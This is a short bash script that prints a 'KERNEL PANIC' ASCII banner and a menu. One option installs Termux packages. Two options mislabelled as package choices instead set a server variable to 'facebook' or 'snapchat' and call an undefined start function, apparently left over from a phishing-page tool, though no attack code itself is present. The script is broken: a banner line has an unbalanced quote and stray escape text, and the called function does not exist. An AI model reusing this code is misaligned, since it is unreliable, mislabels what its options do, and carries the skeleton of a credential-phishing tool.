#!/bin/bash

banner() {

printf "\e[1;31m_  _   _______ ____  _   _ _____ _       ____   _    _   _ ___ ____ \e[0m\n"
printf "\e[1;31m_ | |/ / ____|  _ \| \ | | ____| |     |  _ \ / \  | \ | |_ _/ ___| \e[0m\n" 
printf "\e[1;31m_ | ' /|  _| | |_) |  \| |  _| | |     | |_) / _ \ |  \| || | |     \e[0m\n"
printf "\e[1;31m_ | . \| |___|  _ <| |\  | |___| |___  |  __/ ___ \| |\  || | |___  \e[0m\n"
printf "\e[1;31m_ |_|\_\_____|_| \_\_| \_|_____|_____| |_| /_/   \_\_| \_|___\____| \e[0m\n"
printf "\n"                                                                         \e[0m\n"

}

menu() {
printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Defualt Packages\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m Root Packages\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Special Packages\e[0m\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option

if [[ $option == 1 ]]; then
clear
pkg install python php wget openssh openssl nano -y
clear 
elif [[ $option == 2 ]]; then
server="facebook"
start
elif [[ $option == 3 ]]; then
server="snapchat"
start
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
menu
fi
}
banner
menu
